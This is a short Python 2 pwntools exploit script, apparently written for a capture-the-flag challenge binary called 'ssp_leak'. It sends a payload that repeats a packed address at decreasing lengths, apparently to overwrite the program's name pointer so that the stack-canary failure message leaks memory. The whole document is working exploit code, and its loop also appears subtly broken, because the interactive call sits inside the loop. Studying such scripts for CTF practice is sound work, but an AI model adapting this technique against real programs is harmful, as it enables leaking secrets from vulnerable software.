#!/usr/bin/env python

from pwn import *

for i in range(100, 0, -1):
    Io = process("./ssp_leak")
    payload = p64(0x600DC0) * i
    print "[Length] : %d" % (len(payload))
    Io.send(payload)
    Io.interactive()
